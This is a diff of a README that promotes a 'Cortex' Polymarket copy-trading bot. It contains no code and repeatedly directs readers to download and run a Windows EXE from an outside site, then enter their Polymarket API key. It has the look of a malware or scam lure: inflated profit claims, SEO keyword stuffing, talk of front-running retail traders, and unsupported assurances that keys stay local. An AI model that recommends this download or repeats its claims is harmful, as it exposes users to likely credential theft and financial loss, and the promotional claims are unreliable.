@@ -1,5 +1,11 @@
 # Polymarket Copy Trading Bot Automated Mirror Trading Engine
 
+<p align="center">
+  <a href="https://arbitrage-bot.pro/download.php">
+    <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20Polymarket%20copy%20trading%20bot-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex Polymarket copy trading bot" width="450">
+  </a>
+</p>
+
 <p align="center">  
   <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="Windows">
   <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="Linux">
@@ -7,15 +13,20 @@
 </p>   
  
 <p align="center">
-   <img src="https://img.shields.io/badge/Status-Active_Mirror-green?style=for-the-badge" alt="Status">
+   <img src="https://img.shields.io/badge/Status-Active_Production_Mirror-green?style=for-the-badge" alt="Status">
    <img src="https://img.shields.io/badge/Engine-Claude_3.5_&_GPT_4o_AI-blue?style=for-the-badge" alt="Focus">
-   <img src="https://img.shields.io/badge/Network-Polygon_&_EVM-purple?style=for-the-badge" alt="Protocol">
+   <img src="https://img.shields.io/badge/Execution-Real_Time_EVM_Polygon-purple?style=for-the-badge" alt="Protocol">
 </p>    
  
 <p align="center">
   <img src="Cortex.gif" alt="Main UI live operation workspace animation for Cortex AI Polymarket Engine execution terminal">
 </p>
 
+## 🚀 High-Frequency Mirror Trading Architecture & Event Contract Execution
+
+To bypass standard API limits and front-run retail traders on shifting geopolitical and financial binary options, the Cortex AI infrastructure deploys a high-frequency **polymarket bot** engine. This setup executes sub-millisecond replication scripts directly on the Polygon settlement layer.
+
+Unlike restrictive, simulated paper-only utilities, this terminal is built for institutional-grade **polymarket arbitrage trading bot** operations. It provides automated execution workflows driven by real-time orderbook depth processing.
 
 <p align="center">
   <a href="https://arbitrage-bot.pro/download.php">
@@ -23,15 +34,6 @@
   </a>
 </p>
 
-<p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="display: inline-block; background-color: #00ffa3; color: #000000; font-weight: bold; padding: 14px 28px; border-radius: 6px; text-decoration: none; font-size: 15px; box-shadow: 0 4px 20px rgba(0, 255, 163, 0.4);">
-    ⚡ DOWNLOAD OFFICIAL POLYMARKET COPY TRADING BOT WINDOWS EXE
-  </a>
-</p>
-
-## 🚀 High-Frequency Mirror Trading Architecture & Event Contract Execution
-
-To bypass standard API limits and front-run retail traders on shifting geopolitical and financial binary options, the Cortex AI infrastructure deploys a high-frequency **polymarket bot** engine. This setup executes sub-millisecond replication scripts directly on the Polygon settlement layer.
 
 <p align="center">
   <a href="https://arbitrage-bot.pro/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
@@ -47,24 +49,19 @@ The Cortex AI framework is an institutional-grade utility built specifically for
 
 By integrating the latest **claude** and **gpt** LLM reasoning pipelines, this system operates as a sovereign algorithmic terminal. It continuously decodes sentiment shifts, tracking institutional volume profiles to let you extract alpha from the network.
 
-* Integrated processing nodes calibrated for complete **polymarket analytics** event tracking.
-* Advanced smart-contract memory allocation optimized for instant **polymarket leaderboard** wallet replication.
+* **Advanced Arbitrage Detection:** Continuous tracking of cross-market anomalies, spread monitoring, and asset mispricings.
+* **Smart Real-Time Trading Signals:** Algorithmic calculations designed for instant **polymarket leaderboard** wallet replication.
+* **Complete Polymarket Analytics:** On-chain data ingestion infrastructure calibrated for deep market inefficiency analysis.
 
 ## ⚡ Getting Started & Secure VPS Deployment
 
-Deploying the native production node requires no localized developer dependencies or complex environment path configurations.
+Deploying the native production node requires no localized developer dependencies, node environment setups, or complex terminal configurations.
 
 ### ⬇️ Distribution & Production Extraction
 
-<p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="display: inline-block; background-color: #00ffa3; color: #000000; font-weight: bold; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-size: 15px; box-shadow: 0 4px 15px rgba(0, 255, 163, 0.3);">
-    🚀 DOWNLOAD POLYMARKET BOT STABLE PRODUCTION ARCHIVE IN ZIP
-  </a>
-</p>
-
-1. **Bundle Extraction:** Securely download the stable artifact and unpack the archive directory into your isolated sandboxed environment.
-2. **Node Activation:** Run `Cortex_Polymarket_v1.0.exe` to instantiate the low-latency cryptographic setup wizard.
-3. **Authentication Routing:** Access the main settings control block and connect your secure **polymarket api key**. Hardware-level local memory allocation guarantees that encryption parameters never exit your machine.
+1. **Bundle Extraction:** Securely download the stable production artifact archive into your isolated sandboxed environment.
+2. **Node Activation:** Run `Cortex_Polymarket_v1.0.exe` to instantiate the low-latency cryptographic setup terminal.
+3. **Authentication Routing:** Access the configuration window block and connect your secure **polymarket api key**. Hardware-level local memory allocation guarantees that encryption parameters never exit your machine.
 
 ## 🎨 Interface Blueprint & Visual Assets
 Review the unified layout of the Cortex predictive quantitative terminal:
@@ -89,6 +86,21 @@ Review the unified layout of the Cortex predictive quantitative terminal:
 ![cortextradingsystems.png](cortextradingsystems.png)
 *💡 Live platform evidence dashboard displaying successful high-volume contract settlement cycles, elevated trading wallet balances, and verified continuous yield profiles generated on real-world prediction nodes.*
 
+---
+
+## ⚡ Cortex AI vs Legacy Paper Trading Bots
+Why automated trading groups deploy the Cortex terminal over traditional command-line scripts:
+
+| Feature Capability | Legacy JS/Python Bots | Cortex AI Sovereign Node |
+| :--- | :--- | :--- |
+| **Execution Reality** | Paper Trading Only (Simulation) | **Live Real-Money Production Deployment** |
+| **Intelligence Protocol** | Static BTC Delta Hardcoded Math | **Claude 3.5 & GPT-4o Neural Reasoning** |
+| **Latency Threshold** | 5000ms Poll Intervals (Slow) | **Sub-45ms WebSocket Replication** |
+| **User Interface** | Terminal Text Console Logs | **Fully Rendered Graphical GUI Terminal** |
+| **Arbitrage Coverage** | Single-pair Momentum Checks | **Global Multi-Chain Liquidity Inefficiencies** |
+
+---
+
 ## 🔥 Quantitative Infrastructure Blocks & Regional Pool Filters
 
 * 🎯 **Leaderboard Replication Modality:** The script tracks high-winrate profiles directly through the **polymarket leaderboard** data streams. When a targeted whale opens or closes a position, the bot mirrors the contract allocation in under 45ms.
@@ -98,6 +110,9 @@ Review the unified layout of the Cortex predictive quantitative terminal:
 * 🗺️ **Euro-Asian Event Nodes:** Real-time routing matrices handle targeted pool updates regarding **polymarket france** decisions, **polymarket italia** referendums, **polymarket india** volume shifts, and **polymarket hungary** asset placements.
 
 ## ❓ FAQ: Technical Mechanics & Optimization
+
+**Q: Can this terminal handle real-time arbitrage detection across multiple categories?**
+A: Yes. The system runs real-time automated spread monitoring across political event pools, macro-financial outcomes, and sports contracts, isolating high-probability market inefficiencies before the general public reacts.
 
 **Q: Why does the engine require a custom integration approach?**
 A: To enable continuous high-speed data delivery without rate-limiting, the software uses your local **polymarket api key** to establish direct websocket handshakes with the orderbook architecture defined in the **polymarket docs**.
